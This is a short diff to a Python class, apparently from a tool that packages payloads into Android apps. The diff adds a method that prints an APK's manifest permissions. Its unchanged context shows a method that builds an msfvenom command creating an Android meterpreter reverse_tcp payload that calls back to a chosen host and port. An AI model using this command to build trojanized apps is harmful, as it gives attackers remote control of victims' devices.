@@ -80,6 +80,12 @@ class PackadroidSession():
         self.__activities = manifest_analyzer.find_all_activities(manifest_path)
         return self.__activities
 
+    def list_permissions(self):
+        permissions = manifest_analyzer.get_permissions(self.__original_apk_dec_path + "/AndroidManifest.xml")
+        for p in permissions:
+            print(p)
+        return
+
     def generate_meterpreter(self, ip, lport):
         """ executes meterpreter with the options given"""
         command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + lport + " -o meterpreter.apk"
